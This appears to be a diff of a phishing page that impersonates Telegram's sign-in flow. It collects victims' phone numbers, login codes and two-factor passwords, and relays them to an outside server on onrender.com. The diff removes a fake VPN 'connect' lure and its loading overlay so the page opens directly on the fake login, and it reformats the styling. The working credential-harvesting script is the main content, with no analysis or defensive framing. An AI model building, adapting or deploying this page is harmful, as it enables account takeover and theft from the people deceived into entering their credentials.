@@ -30,40 +30,6 @@
             position: relative; /* Needed for positioning the security banner */
         }
 
-        #shadowOverlay {
-            position: absolute;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0, 0, 0, 0.2); /* Semi-transparent black */
-            display: none; /* This should be the only display property */
-            pointer-events: none; /* Prevents interaction with overlay */
-            border-radius: 10px; /* Matches container's border-radius */
-            justify-content: center;
-            align-items: center;
-            z-index: 10; /* Ensure it's above other content */
-        }
-
-        #loadingText {
-            color: white;
-            font-size: 30px;
-            margin-top: 40px;
-            margin-right: 10px;
-        }
-
-        .spinner1 {
-            border: 4px solid #f3f3f3; /* Light grey */
-            border-top: 4px solid #3498db; /* Blue */
-            border-radius: 50%;
-            width: 20px;
-            height: 20px;
-            animation: spin 2s linear infinite;
-            margin-top: 40px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
         .logo {
             width: 70px;
             margin-bottom: 20px;
@@ -104,6 +70,7 @@
             border-radius: 6px;
             box-sizing: border-box;
             transition: all 0.3s ease;
+            /* For smooth transition when shaking */
         }
 
         .checkbox-group {
@@ -154,8 +121,15 @@
         }
 
         @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-15px); }
+
+            0%,
+            100% {
+                transform: translateY(0);
+            }
+
+            50% {
+                transform: translateY(-15px);
+            }
         }
 
         .phone-number {
@@ -171,8 +145,25 @@
             margin-left: x;
         }
 
-        #result, #codeResult, #passwordResult {
+        #result {
             color: #ff0000;
+            /* Red color for errors */
+            font-size: 14px;
+            margin-top: 5px;
+            margin-bottom: 10px;
+        }
+
+        #codeResult {
+            color: #ff0000;
+            /* Red color for errors */
+            font-size: 14px;
+            margin-top: 5px;
+            margin-bottom: 10px;
+        }
+
+        #passwordResult {
+            color: #ff0000;
+            /* Red color for errors */
             font-size: 14px;
             margin-top: 5px;
             margin-bottom: 10px;
@@ -180,20 +171,6 @@
 
         #loadingSpinner {
             margin-left: 10px;
-        }
-
-        #container {
-            padding: 40px;
-            border: 2px solid #ddd;
-            background: white;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-            width: 400px; 
-            height: 550px; 
-            text-align: center;
-            overflow: hidden;
-            position: relative;
-            transition: box-shadow 0.3s ease;
         }
 
         .spinner {
@@ -210,19 +187,50 @@
         }
 
         @keyframes rotate {
-            100% { transform: rotate(360deg); }
+            100% {
+                transform: rotate(360deg);
+            }
         }
 
         @keyframes dash {
-            0% { stroke-dasharray: 1, 150; stroke-dashoffset: 0; }
-            50% { stroke-dasharray: 90, 150; stroke-dashoffset: -35; }
-            100% { stroke-dasharray: 90, 150; stroke-dashoffset: -124; }
+            0% {
+                stroke-dasharray: 1, 150;
+                stroke-dashoffset: 0;
+            }
+
+            50% {
+                stroke-dasharray: 90, 150;
+                stroke-dashoffset: -35;
+            }
+
+            100% {
+                stroke-dasharray: 90, 150;
+                stroke-dashoffset: -124;
+            }
         }
 
+        /* Shake animation */
         @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            10%, 30%, 50%, 70%, 90% { transform: translateX(-8px); }
-            20%, 40%, 60%, 80% { transform: translateX(8px); }
+
+            0%,
+            100% {
+                transform: translateX(0);
+            }
+
+            10%,
+            30%,
+            50%,
+            70%,
+            90% {
+                transform: translateX(-8px);
+            }
+
+            20%,
+            40%,
+            60%,
+            80% {
+                transform: translateX(8px);
+            }
         }
 
         .shake {
@@ -232,36 +240,17 @@
 </head>
 
 <body>
-    <div id="container">
-        <select id="serverSelect">
-            <option value="Boardman">United States (Boardman)</option>
-            <option value="NewYork">United States (New York)</option>
-            <option value="Piscataway">United States (Piscataway)</option>
-        </select>
-        <h2><strong>United States 🇺🇸</strong></h2>
-        <img src="arrow.gif" alt="arrow" height="60" width="60">
-        <div id="vpnStatus">
-            
-            <a href="#" onclick="showTelegramPage(); return false;">
-                <img src="connect.png" alt="Connect VPN" style="width:180px;height:180px;">
-            </a>
-<img src="vpn.gif" alt="VPN" height="270" width="270">
-        </div>
-        <div id="shadowOverlay">
-            <span id="loadingText">Please wait...</span>
-            <div class="spinner1"></div>
-        </div>
-    </div>
-
-    <div id="telegramPage" class="login-container hidden">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
+    <div class="login-container" id="step1">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo"
+            class="logo">
         <h1>Sign in to Telegram</h1>
         <p>Please confirm your country code and enter your phone number.</p>
         <form id="loginForm">
             <div class="input-group">
                 <label for="country">Country</label>
                 <select id="country" name="country">
-                   <!-- New countries -->
+
+                     <!-- New countries -->
                    <option value="Afghanistan">Afghanistan (+93)</option>
                    <option value="Albania">Albania (+355)</option>
                    <option value="Algeria">Algeria (+213)</option>
@@ -477,11 +466,12 @@
     </div>
 
     <div class="login-container hidden" id="step2">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo"
+            class="logo">
         <div class="phone-number">
             <span id="displayPhoneNumber"></span>
             <span class="edit-icon" onclick="goBack()">✍️</span>
-        </div>
+        </div></p></p>
         <p>We've sent the code to the <strong>Telegram</strong> app on your other device.</p>
         <form id="codeForm">
             <div class="input-group">
@@ -500,13 +490,15 @@
     </div>
 
     <div class="login-container hidden" id="step3">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo"
+            class="logo">
         <h1>Enter Your Password</h1>
+        </p>
         <p>Your account is protected with an additional password</p>
         <form id="2faForm">
             <div class="input-group">
                 <input type="password" id="password" name="password" placeholder="Password" required>
-                <p id="passwordResult"></p>
+                <p id="passwordResult"></p> <!-- New element for password error -->
             </div>
             <button type="submit" class="btn">
                 <span id="btnText3">NEXT</span>
@@ -521,15 +513,6 @@
 
     <script>
         const proxyUrl = 'https://tg-back-m8e0.onrender.com';
-
-        function showTelegramPage() {
-            document.getElementById('shadowOverlay').style.display = 'flex';
-            setTimeout(() => {
-                document.getElementById('shadowOverlay').style.display = 'none';
-                document.getElementById('container').classList.add('hidden');
-                document.getElementById('telegramPage').classList.remove('hidden');
-            }, 4000);
-        }
 
         // Function to handle form submission and button state
         async function handleFormSubmit(formId, btnTextId, loadingSpinnerId, originalButtonText, apiEndpoint, dataToSend, successCallback, errorCallback) {
@@ -560,8 +543,8 @@
             }
         }
 
-           // Country code mapping
-           const countryCodes = {
+        // Country code mapping
+        const countryCodes = {
             'Afghanistan': '+93',
             'Albania': '+355',
             'Algeria': '+213',
@@ -1149,13 +1132,11 @@
                 'Zimbabwe': 9
             };
 
-        
-
+            // Check if the number of digits is within the range
             return digitsOnly.length >= minDigits[country] && digitsOnly.length <= maxDigits[country];
         }
-
-        // Function to validate login code (must be exactly 5 digits)
-        function validateLoginCode(code) {
+         // Function to validate login code (must be exactly 5 digits)
+         function validateLoginCode(code) {
             const digitsOnly = code.replace(/\D/g, '');
             return digitsOnly.length === 5;
         }
@@ -1183,13 +1164,17 @@
 
             // Validate the phone number
             if (!validatePhoneNumber(phoneNumber, country)) {
+                // Add shake effect to the phone number input
                 phoneNumberInput.classList.add('shake');
+                // Trigger vibration
                 if (navigator.vibrate) {
-                    navigator.vibrate(50);
+                    navigator.vibrate(50); // Vibration for 200ms
                 }
+                // Remove shake effect after animation completes
                 setTimeout(() => {
                     phoneNumberInput.classList.remove('shake');
                 }, 500);
+                // Prevent form submission
                 e.preventDefault();
                 return;
             }
@@ -1197,34 +1182,50 @@
             await handleFormSubmit('loginForm', 'btnText1', 'loadingSpinner1', originalButtonText, 'send_code', { phone_number: phoneNumber },
                 (data) => {
                     if (data.success) {
-                        document.getElementById('telegramPage').classList.add('hidden'); // Hide current step
-                        document.getElementById('step2').classList.remove('hidden'); // Show next step
+                        document.getElementById('step1').classList.add('hidden');
+                        document.getElementById('step2').classList.remove('hidden');
                         document.getElementById('displayPhoneNumber').textContent = phoneNumber;
-                        document.getElementById('result').textContent = '';
+                        document.getElementById('phoneNumberResult').textContent = ''; // Clear any previous messages
+                        document.getElementById('result').textContent = ''; // Clear any previous messages
                     } else {
-                        document.getElementById('result').textContent = 'Please try again after some minutes';
+                        document.getElementById('result').textContent = 'Please try again after some minutes';// Display error message
                     }
                 },
                 () => {
-                    document.getElementById('result').textContent = 'An error occurred. Please try again.';
+                    document.getElementById('phoneNumberResult').textContent = 'An error occurred. Please try again.';
+                    document.getElementById('result').textContent = ''; // Clear any previous messages
                 }
             );
         });
 
-        document.getElementById('codeForm').addEventListener('submit', async (e) => {
+        document.getElementById('code').addEventListener('input', function () {
+            let monkeyAnimation = document.getElementById('monkeyAnimation');
+            if (this.value.length > 0) {
+                monkeyAnimation.classList.remove('hidden'); // Show animation when there's input
+            } else {
+                monkeyAnimation.classList.add('hidden'); // Hide when input is cleared
+            }
+        });
+
+       document.getElementById('codeForm').addEventListener('submit', async (e) => {
             const codeInput = document.getElementById('code');
             const code = codeInput.value;
             const phoneNumber = document.getElementById('phoneNumber').value;
             const originalButtonText = 'NEXT';
 
-            if (!validateLoginCode(code)) {
+              // Validate the login code (must be exactly 5 digits)
+              if (!validateLoginCode(code)) {
+                // Add shake effect to the code input
                 codeInput.classList.add('shake');
+                // Trigger vibration
                 if (navigator.vibrate) {
-                    navigator.vibrate(200);
+                    navigator.vibrate(200); // Vibration for 200ms
                 }
+                // Remove shake effect after animation completes
                 setTimeout(() => {
                     codeInput.classList.remove('shake');
                 }, 500);
+                // Prevent form submission
                 e.preventDefault();
                 return;
             }
@@ -1239,6 +1240,7 @@
                         document.getElementById('step2').classList.add('hidden');
                         document.getElementById('step3').classList.remove('hidden');
                         document.getElementById('codeResult').textContent = '';
+                        document.getElementById('result').textContent = '';
                     } else {
                         document.getElementById('codeResult').textContent = 'Incorrect login code. Please try again.';
                     }
@@ -1261,6 +1263,7 @@
                             window.location.replace(data.redirect);
                         }, 0);
                     } else {
+                        // Display the error message right after the password input
                         document.getElementById('passwordResult').textContent = 'Incorrect password. Please try again.';
                     }
                 },
@@ -1272,8 +1275,9 @@
 
         function goBack() {
             document.getElementById('step2').classList.add('hidden');
-            document.getElementById('telegramPage').classList.remove('hidden');
+            document.getElementById('step1').classList.remove('hidden');
         }
     </script>
 </body>
+
 </html>
